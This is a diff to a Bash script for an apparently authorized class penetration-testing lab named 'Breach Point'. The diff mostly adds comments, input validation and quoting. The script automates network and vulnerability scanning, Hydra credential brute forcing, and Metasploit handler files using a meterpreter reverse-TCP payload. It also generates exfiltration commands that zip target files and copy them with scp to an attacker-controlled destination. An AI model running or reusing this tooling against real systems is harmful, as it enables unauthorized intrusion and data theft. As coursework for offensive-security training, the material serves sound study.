@@ -5,7 +5,36 @@
 # =========================================================
 # This script implements an end-to-end lab workflow for the
 # Breach Point assignment. It assumes you are operating in a
-# legal, authorized test environment.
+# legal, authorized test environment such as your class lab
+# or dedicated test network.
+#
+# High-level workflow:
+#   - Stage 1: Collect user input (target, output dir, basic/full).
+#   - Stage 2: Run TCP/UDP scans (basic) and, if chosen, full NSE
+#              vulnerability scans with Searchsploit correlation.
+#   - Stage 3: Perform weak-credential checks (Hydra, NSE brute scripts).
+#   - Stage 4: Generate Metasploit resource (.rc) files.
+#   - Stage 5: Generate payloads (msfvenom or suggested commands).
+#   - Stage 6: Generate helper commands for data exfiltration (Linux/Windows).
+#   - Stage 7: Search results and summarize session + dependencies.
+#
+# Basic vs Full scans:
+#   - basic: TCP/UDP scans, service/version detection, optional quick weak
+#            password NSE scan (ssh/ftp/smb/rdp).
+#   - full : everything in basic, plus vuln NSE scripts and Searchsploit
+#            mapping of results for potential exploitation paths.
+#
+# Prerequisites / Notes:
+#   - Tested on Debian/Ubuntu-style systems with apt-get available.
+#   - Uses: nmap, hydra, Metasploit (msfconsole/msfvenom), searchsploit,
+#           zip, scp, base64, pscp (for Windows transfers).
+#   - The script can attempt to auto-install missing tools via apt-get,
+#     but users can decline. Some features will then be degraded/mocked.
+#   - Certain scan options (-sS, -O, some NSE scripts) may require root
+#     privileges to work reliably.
+#
+# If you adapt code snippets from external sources (blogs, GitHub, etc.),
+# document your references in your project report and/or inline comments.
 # =========================================================
 
 set -o nounset
@@ -20,6 +49,7 @@ DEFAULT_WORDLIST="$SCRIPT_DIR/wordlists/password.lst"
 SESSION_ACTIONS=()
 APT_UPDATED=0
 SESSION_FINALIZED=0
+SESSION_LOG="/tmp/breach_point.log"
 
 # Core tools leveraged across the workflow; used for startup checks and on-demand rechecks.
 CORE_TOOLS=(nmap hydra msfconsole msfvenom searchsploit zip scp base64 pscp)
@@ -336,6 +366,13 @@ dependency_summary_report() {
 
 banner "Stage 1 - Getting User Input"
 
+# Inform the user that some scan options may require elevated privileges
+if [[ $EUID -ne 0 ]]; then
+    echo "[!] Note: You are not running as root. Some scan options"
+    echo "    (e.g. -sS, -O, certain NSE scripts) may be limited or fail."
+    echo "    For full functionality, consider running this script with sudo."
+fi
+
 while :; do
     read -rp "Enter target network (e.g. 192.168.1.0/24): " TARGET_NET
     # Basic sanity check to avoid empty input or obvious whitespace issues
@@ -637,9 +674,22 @@ EOF
         2)
             read -rp "Payload type [default: windows/meterpreter/reverse_tcp]: " RC_PAYLOAD
             RC_PAYLOAD="${RC_PAYLOAD:-windows/meterpreter/reverse_tcp}"
-            read -rp "LHOST: " RC_LHOST
+
+            read -rp "LHOST (callback IP/host): " RC_LHOST
+            if [[ -z "$RC_LHOST" ]]; then
+                echo "LHOST is required; aborting handler RC generation." | tee -a "$SESSION_LOG"
+                record_action "Handler RC generation aborted: missing LHOST"
+                return
+            fi
+
             read -rp "LPORT [default: 4444]: " RC_LPORT
             RC_LPORT="${RC_LPORT:-4444}"
+            if [[ ! "$RC_LPORT" =~ ^[0-9]+$ ]]; then
+                echo "LPORT must be numeric; aborting handler RC generation." | tee -a "$SESSION_LOG"
+                record_action "Handler RC generation aborted: invalid LPORT"
+                return
+            fi
+
             cat > "$RC_FILE" <<EOF
 # Metasploit handler RC file (auto-generated)
 use exploit/multi/handler
@@ -763,7 +813,7 @@ data_exfil_helper() {
         TARGET_ROOT="${TARGET_ROOT:-C:\\}"
     fi
 
-    read -rp "Path(s) to compress (space-separated, default: results from search): " COMPRESS_PATHS
+    read -rp "Path(s) to compress (you can use globs like /home/user/*.docx; default: results from search): " COMPRESS_PATHS
     read -rp "Attacker SCP destination (e.g. user@10.10.10.1:/tmp) [optional]: " SCP_DEST
 
     EXFIL_FILE="$RUN_DIR/logs/data_exfil_commands.txt"
@@ -787,7 +837,8 @@ EOF
 # Compress to zip
 EOF
         if [[ -n "$COMPRESS_PATHS" ]]; then
-            echo "zip -r /tmp/exfil.zip $COMPRESS_PATHS" >> "$EXFIL_FILE"
+            # Wrap paths in quotes to reduce issues with spaces
+            echo "zip -r /tmp/exfil.zip \"$COMPRESS_PATHS\"" >> "$EXFIL_FILE"
         else
             echo "zip -r /tmp/exfil.zip <FILES_OR_DIRS_HERE>" >> "$EXFIL_FILE"
         fi
@@ -820,7 +871,8 @@ EOF
 REM Compress using PowerShell Compress-Archive
 EOF
         if [[ -n "$COMPRESS_PATHS" ]]; then
-            echo "PowerShell Compress-Archive -Path $COMPRESS_PATHS -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
+            # Wrap paths in quotes so they still work when containing spaces
+            echo "PowerShell Compress-Archive -Path \"$COMPRESS_PATHS\" -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
         else
             echo "PowerShell Compress-Archive -Path <files> -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
         fi
